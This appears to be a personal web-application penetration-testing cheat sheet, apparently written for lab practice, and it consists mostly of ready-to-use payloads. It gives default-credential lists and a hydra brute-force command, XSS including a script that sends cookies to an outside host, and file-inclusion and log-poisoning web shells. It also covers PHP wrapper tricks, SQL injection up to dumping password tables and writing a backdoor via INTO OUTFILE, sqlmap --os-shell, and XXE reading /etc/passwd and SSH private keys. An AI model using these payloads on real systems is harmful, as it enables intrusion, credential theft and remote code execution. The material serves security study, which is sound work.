### Enumeration

1. Check headers + view source code

```
look for:

credentials, comments, used modules possibly vurnalable

in the headers, search for server, php version and non-standart starting with "X-" that can dgive info about the app structure
```

2. Sensitive pages

```
robots.txt
sitemap.xml
crossdomain.xml
/clientaccesspolicy.xml
/phpmyadmin
/manager/html
```

tools for subdirectories enumertaion

```
Basic:

gobuster dir -u http://10.11.1.8/ -w ~/SecLists-master/Discovery/Web-Content/big.txt

Cgis enumeration:

gobuster dir -u http://10.11.1.8/cgi-bin/ -w ~/SecLists-master/Discovery/Web-Content/CGIs.txt

API endpoints:

gobuster dir -u http://10.11.1.13:5985 -w ~/SecLists-master/Discovery/Web-Content/api/api-endpoints.tx

Subdomains enumeration:

gobuster dns -d erev0s.com -w awesome_wordlist.txt -i

```

All-in-one

```
nikto -h http://127.0.0.1
```

3. Pay attention to the url structure (possible file inclusion, directory triversal, id triversal etc.)
4. Set a proxy (Burp) before the app and tak a look at the responces to different requests( form inputs )
5. Try default credentials with login forms or brute force if no fail2ban or simmilar

```
admin:admin
admin:password
admin:administrator
admin:(name of box)
user:user
user:password
user:12345
guest:guest
root:root
(name of box):(name of box)
(default account):(name of application)
```

```
sudo hydra -l admin -P ~/rock.txt 192.168.152.52 http-post-form "/login.php:username=admin&password=^PASS^:I would try another combo. Hopefully, you are not trying these by hand."
```

### Common attacks

#####  Cross-Site Scripting (XSS)

send all the character to check if vulnurable
```
< > ' " { } ;
```

```
<{"=\_/="}> Hello ;')
```

```
<script> alert(window.location.hostname)</script>
```

mostly used to deliver client-side attacs

```
<iframe src=http://10.11.0.4/report height=”0” width=”0”></iframe>
```
stealing cookie
```
<script>
new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;
</script>
```

#####  Directory triversal

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal

```windows
c:/boot.ini
c:/inetpub/logs/logfiles
c:/inetpub/wwwroot/global.asa
c:/inetpub/wwwroot/index.asp
c:/inetpub/wwwroot/web.config
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system32/inetsrv/metabase.xml
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system volume information/wpsettings.dat
c:/system32/inetsrv/metabase.xml
c:/unattend.txt
c:/unattend.xml
c:/unattended.txt
c:/unattended.xml
c:/windows/repair/sam
c:/windows/repair/system
c:\windows\system32\drivers\etc\hosts
C:\xampp\php\php.ini
```

#####  File inclusion

_register_globals_ and _allow_url_ in php.ini

a) Log file poisoning

```windows
C:\xampp\apache\logs\access.log
```

example:

```1
kali@kali:~$ nc -nv 10.11.0.22 80
(UNKNOWN) [10.11.0.22] 80 (http) open

<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>

HTTP/1.1 400 Bad Request
```

```2
http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig
```

```1
curl http://192.168.152.52/ -H "User-Agent: <?php system($_GET['cmd']); ?>"
```

this one works always

```
curl http://192.168.152.52/ -H "User-Agent: <?php echo '<pre>' . system('ls') . '</pre>';?>"
```

#####   Remote File Inclusion

```
http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt
```

```
use %00  or ? to terminate a string
```

#####   PHP wrapers

php://filter

```
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
```

php://zip

```
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php
```

php://data

```
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```

php://expect

```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```

php://input

```
curl -X POST --data "<?php echo shell_exec('id'); ?>" "https://example.com/index.php?page=php://input%00" -k -v
```

php://phar

If a file operation is now performed on our existing Phar file via the phar:// wrapper, then its serialized meta data is unserialized. If this application has a class named AnyClass and it has the magic method __destruct() or __wakeup() defined, then those methods are automatically invoked

```
// create new Phar
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); ? >');

// add object of any class as meta data
class AnyClass {}
$object = new AnyClass;
$object->data = 'rips';
$phar->setMetadata($object);
$phar->stopBuffering();


class AnyClass {
    function __destruct() {
        echo $this->data;
    }
}
// output: rips
include('phar://test.phar');
```

### SQLI

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

fast check 

```
include single quote '
```

authenticatino bypass

```
' or 1=1;#
' or 1=1 LIMIT 1;#
```

More complecated quries:

1. column number enumeration

```
http://10.11.0.22/debug.php?id=1 order by 1
http://10.11.0.22/debug.php?id=1 order by 2
http://10.11.0.22/debug.php?id=1 order by 3

ERROR! --> 3 columns
```
2. union

each select must return the same number of collumns 

```
http://192.168.152.52/debug.php?id=1%20union%20select%20*%20from%20users;
http://10.11.0.22/debug.php?id=1 union all select 1, 2, @@version
http://10.11.0.22/debug.php?id=1 union all select 1, 2, user()
SELECT database() --> get db_name

DB dumping:

1. http://10.11.0.22/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables --> find table_name
2. http://10.11.0.22/debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users' --> find columns name 
3. http://10.11.0.22/debug.php?id=1 union all select 1, username, password from users --> get data \(^-^)/

from tryhackme group_concat() to get all in one column and don't forget to target by database() name

0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'` -- take sqli_one from database()



u can create a table not to get lost:

version: 
database(table_schema):
table_name:
column_name:
users:
password:
etc.
```

3. to command execution

```
http://10.11.0.22/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')


http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```

4. Boolean Based

```
for API endpoint
https://website.thm/checkuser?username=admin123' union select 1;--
https://website.thm/checkuser?username=admin123' union select 1,2;--
https://website.thm/checkuser?username=admin123' union select 1,2, 3;--  --> returns true as response

https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 where database() like 's%';--  --> db name triversing

https://website.thm/checkuser?username=admin123' union select 1,2,3 from information_schema.tables where table_schema = 'sqli_three' and table_name like 'users';

https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';

https://website.thm/checkuser?username=admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
```

5. Time bases SQLi

```
trst: admin123' UNION SELECT SLEEP(5);--`

referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--

admin' AND sleep(10);-- -
```

God bless

```
sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id"

sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --dump

sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --os-shell
```


Practise in labs

```
C:\tools\web_attacks> java -jar gadgets-1.0.0.jar
```


###### Rerigister a new user

1. try to register with space " admin"
2. take a look at a session cookie - decrypt - if weak craft admin cookie

###### XXE

fast xml syntax 

```
<?xml version="1.0" encoding="UTF-8"?>  -> xml prolog
<mail>                                  -> root elemnent
   <to>falcon</to>                      -> chil element
   <from>feast</from>  
   <subject>About XXE</subject>  
   <text category = "message">Teach about XXE</text>  
</mail>
```

DTD stands for Document Type Definition. A DTD defines the structure and the legal elements and attributes of an XML document.

1. In-babd XXE

```
<!DOCTYPE replace [<!ENTITY name "feast"> ]>  
 <userInfo>  
  <firstName>falcon</firstName>  
  <lastName>&name;</lastName>  
 </userInfo>


<?xml version="1.0"?>  
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>  
<root>&read;</root>

<?xml version="1.0"?><!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/falcon/.ssh/id_rsa'>]><root>&read;</root>
```

### MSSQL
**error based sql injections** https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/